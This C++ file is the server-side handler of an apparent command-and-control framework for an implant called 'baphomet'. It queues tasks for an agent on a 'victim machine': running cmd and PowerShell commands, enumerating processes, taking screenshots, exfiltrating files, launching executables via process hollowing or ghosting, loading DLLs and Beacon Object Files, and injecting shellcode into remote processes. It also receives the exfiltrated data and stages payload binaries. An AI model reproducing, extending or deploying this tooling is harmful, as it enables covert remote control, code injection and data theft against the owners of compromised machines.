//
// Created by diago on 2024-04-25.
//

#include "baphomet.hpp"
#include "../../components/instance.hpp"

namespace lurch {
    accepted_commands baphomet::commands;
}

void
lurch::baphomet::init_commands() {

    if(!commands.ready()) {

        commands.add_command("pwd", "prints the working directory of the implant");
        commands.add_command("ls", "displays files in the working directory");
        commands.add_command("procenum", "enumerates all running processes on the victim machine");
        commands.add_command("screenshot", "takes a screenshot and exfiltrates it");
        commands.add_command("whoami", "gets whoami.exe info without starting a shell process");
        commands.add_command("get_task", "used by the agent to retrieve a task.");
        commands.add_command("tasks", "display all existing tasks.");
        commands.add_command("die", "tells the running agent to exit.");
        commands.add_command("staged", "display staged files that can be downloaded by the agent.");
        commands.add_command("help", "display this help message and exit.");

        commands.add_command("cd", "changes the working directory")
            .arg<std::string>("--directory", "-d", true);

        commands.add_command("cat", "displays file contents")
            .arg<std::string>("--file-name", "-f", true);

        commands.add_command("mkdir", "creates a directory")
            .arg<std::string>("--directory", "-d", true);

        commands.add_command("rm", "removes a directory or file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("cp", "copies a file to a specified location")
            .arg<std::string>("--source", "-s", true)
            .arg<std::string>("--destination", "-d", true);

        commands.add_command("ps", "executes a powershell command and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("cmd", "executes a shell command (cmd.exe) and returns the output")
            .arg<std::string>("--command", "-c", true);

        commands.add_command("upload", "exfiltrates a file")
            .arg<std::string>("--directory-entry", "-de", true);

        commands.add_command("runexe", "runs an executable file on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true)
            .arg<empty>("--hollow", "-h", false)
            .arg<empty>("--ghost", "-g", false);

        commands.add_command("rundll", "runs a DLL on the victim machine")
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("runbof", "runs a Beacon Object File on the victim machine") // TODO: no bof arguments yet :(
            .arg<std::string>("--staged-file", "-sf", true);

        commands.add_command("runshellcode", "loads shellcode into memory and executes it")
            .arg<std::string>("--staged-file", "-sf", true)
            .arg<empty>("--local", "-l", false)
            .arg<int64_t>("--pid", "-p", false);

        commands.add_command("complete_task", "used by the agent to complete a task.")
            .arg<std::string>("--result", "-r", true);

        commands.done();
    }
}


lurch::result<std::string>
lurch::baphomet::runshellcode(const command &cmd) {

    const auto [file_name, local, pid] =
        cmd.get<std::string>("--staged-file", "-sf")
            .with<empty>("--local", "-l")
            .with<int64_t>("--pid", "-p")
            .done();

    if(!file_is_staged(*file_name)) {
        return error("that file has not been staged.");
    }

    if((local && pid) || (!local && !pid)) {
        return error("Please specify either local execution or a remote process' PID.");
    }

    if(pid && *pid < 0) {
        return error("please specify a valid PID.");
    }

    std::vector<std::string> queue_args;
    std::string queue_msg;
    pid
      .and_then([&](int64_t exists) {
        queue_args = {*file_name, std::to_string(exists)};
        queue_msg  = "Queued shellcode to be ran in a remote process.";
        return std::optional(exists);
      })
      .or_else([&] {
        queue_args = {*file_name, "local"};
        queue_msg  = "Queued shellcode to be ran locally.";
        return std::optional<int64_t>(std::nullopt);
      });

    return generic_queue_task(cmd, queue_args, queue_msg);
}


lurch::result<std::string>
lurch::baphomet::runexe(const command &cmd) {

    const auto [file_name, hollow, ghost] =
    cmd.get<std::string>("--staged-file", "-sf")
        .with<empty>("--hollow", "-h")
        .with<empty>("--ghost", "-g")
        .done();

    std::string type;
    if((hollow && ghost) || (!hollow && !ghost) ) {
        return error("Please specify either hollowing or ghosting.");
    }

    if(file_name->find_first_of('.') == std::string::npos) {
        return error("invalid file name.");
    }

    if(!file_is_staged(*file_name)) {
        return error("this file has not been staged.");
    }

    hollow
        .and_then([&](empty exists) {
            type = "hollow";
            return std::optional(exists);
        })
        .or_else([&] {
            type = "ghost";
            return std::optional<empty>(std::nullopt);
        });

    return delimit_command({"runexe", *file_name, type})
        .and_then([&](std::string task_string) {
            tasks.push(task_string);
            return result<std::string>("queued executable to be ran:" + file_name.value());
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::rundll(const command &cmd) {

    const std::string file_name = std::get<0>(cmd.get<std::string>("--staged-file", "-sf").done()).value();
    if(!file_is_staged(file_name)) {
        return error("that file has not been staged.");
    }

    return generic_queue_task(
        cmd,
        { file_name },
        "Successfully queued DLL to be executed."
    );
}


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    buff.pop_back();
    return { buff };
}


lurch::result<std::string>
lurch::baphomet::generic_queue_task(
        const command &cmd,
        std::vector<std::string> args,
        const std::string &queue_message
    ) {

    args.insert(args.begin(), cmd.name);
    return delimit_command(args)
        .and_then([&](std::string task_str) {
            tasks.push(task_str);
            return result<std::string>(queue_message);
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::print_staged_files() const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        std::string result;
        for(const auto& path : *file_list) {
            result += path.string() + '\n';
        }

        result.pop_back(); //remove trailing \n char
        return { result };
    }
    else {
        return file_list.error();
    }
}


bool
lurch::baphomet::file_is_staged(const std::string &file_name) const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        for(const auto& file : *file_list) {
            if(file_name == file) {
                return true;
            }
        }
    }

    return false;
}


lurch::result<std::string>
lurch::baphomet::get_task() const {
    if(tasks.empty()) {
        return error("no tasks available.");
    }

    const std::string task = tasks.front();
    return { task };
}


lurch::result<std::string>
lurch::baphomet::complete_task(const command &cmd) {
    if(tasks.empty()) {
        return error("no tasks to be completed.");
    }

    tasks.pop();
    return OBJECT_EMPTY_RESPONSE;
}


lurch::result<std::string>
lurch::baphomet::delimit_command(const std::vector<std::string> &strings) {

    std::string buff;
    for(const auto& str : strings) {
        if(str.find_first_of(AGENT_DELIMITING_CHAR) != std::string::npos) {
            return error("couldn't format command, invalid character used.");
        }

        buff += str + AGENT_DELIMITING_CHAR;
    }

    return { buff };
}


lurch::result<std::filesystem::path>
lurch::baphomet::upload(const std::string &file, const std::string &extension) {

    //
    // if the file is prefixed with the "exfil stub" complete the top task.
    //

    if(file.starts_with("!!BAPHOMET_EXFIL!!")) {
        if(tasks.empty()) {
            return error("Exfiltrated file sent, but one was not expected.");
        }

        //
        // Edge case here.
        // If the result is for a screenshot, the file extension should be .bmp,
        // but it will arrive as .tmp because it's stored as a temporary file on the victim machine.
        //
        std::string ext = extension;
        if(tasks.back() == (std::string("screenshot") + AGENT_DELIMITING_CHAR)) {
            ext = "bmp";
        }

        tasks.pop();
        return inst->db.fileman_create(
            std::string_view(file.data() + 18, file.size() - 18),
            ext,
            id,
            true
        );
    }

    //
    // Otherwise, just stage the file. Only these file types are accepted.
    //

    if( extension != "dll"  &&
        extension != "exe"  &&
        extension != "bin"  &&
        extension != "o"    &&
        extension != "obj"
        ) {
        return error("invalid file type for this object.");
    }

    return inst->db.fileman_create(file, extension, id, true);
}


lurch::result<std::string>
lurch::baphomet::recieve(const command &cmd, bool& log_if_error) {

    if(!commands.ready()) {
        init_commands();
    }

    if(!commands.matches(cmd)) {
        return error("invalid command or argument");
    }


    if(cmd == "cd") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--directory", "-d").done()).value() },
            "Successfully queued directory change."
        );
    }

    if(cmd == "cat") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--file-name", "-f").done()).value() },
            "Successfully queued cat."
        );
    }

    if(cmd == "mkdir") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--directory", "-d").done()).value() },
            "Successfully queued directory change."
        );
    }

    if(cmd == "rm") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--directory-entry", "-de").done()).value() },
            "Successfully queued directory entry to be deleted."
        );
    }

    if(cmd == "staged") {
        return print_staged_files();
    }

    if(cmd == "cp") {
        const auto [source, destination] =
            cmd.get<std::string>("--source", "-s")
                .with<std::string>("--destination", "-d")
                .done();

        return generic_queue_task(
            cmd,
            { *destination, *source },
            io::format_str("Successfully queued copy operation:\n{} -> {}", *destination, *source)
        );
    }

    if(cmd == "ps") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--command", "-c").done()).value() },
            "Successfully queued powershell command to be ran."
        );
    }

    if(cmd == "cmd") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--command", "-c").done()).value() },
            "Successfully queued shell command to be ran."
        );
    }

    if(cmd == "upload") {
        return generic_queue_task(
            cmd,
            { std::get<0>(cmd.get<std::string>("--directory-entry", "-d").done()).value() },
            "Successfully queued file to be uploaded."
        );
    }

    if(cmd == "rundll") {
        return rundll(cmd);
    }

    if(cmd == "runshellcode") {
        return runshellcode(cmd);
    }

    if(cmd == "runexe") {
        return runexe(cmd);
    }

    if(cmd == "tasks") {
        return print_tasks();
    }

    if(cmd == "help") {
        return commands.help();
    }

    if(cmd == "get_task") {
        log_if_error = false;
        return get_task();
    }

    if(cmd == "complete_task") {
        return complete_task(cmd);
    }

    //
    // ensure this is last please
    //
    if(cmd.arguments.empty()) {
        tasks.push(cmd.name + AGENT_DELIMITING_CHAR);
        return {"successfully pushed task " + cmd.name};
    }

    return OBJECT_EMPTY_RESPONSE;
}

